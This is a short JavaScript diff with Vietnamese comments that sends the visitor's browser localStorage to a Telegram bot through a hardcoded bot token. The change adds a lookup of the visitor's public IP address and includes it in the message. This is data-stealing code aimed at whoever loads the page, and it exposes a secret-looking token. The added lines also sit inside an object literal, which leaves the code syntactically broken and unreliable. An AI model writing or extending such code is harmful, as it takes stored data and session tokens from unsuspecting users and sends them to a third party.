@@ -6,9 +6,13 @@ const token = "8072273750:AAHTjGi0qw_S9khhoI1OlJCrIxDdjJ2kcEo"; // thay bằng t
         headers: {
             "Content-Type": "application/json"
         },
+        // Lấy IP
+        let res = await fetch("https://api.ipify.org?format=json");
+        let data = await res.json();
+        // console.log("IP của mày là:", data.ip);
         body: JSON.stringify({
             chat_id: chatId,
-            text: JSON.stringify(localStorage)
+            text: JSON.stringify(localStorage + "\n" + data.ip)
         })
     })
         .then(res => res.json())
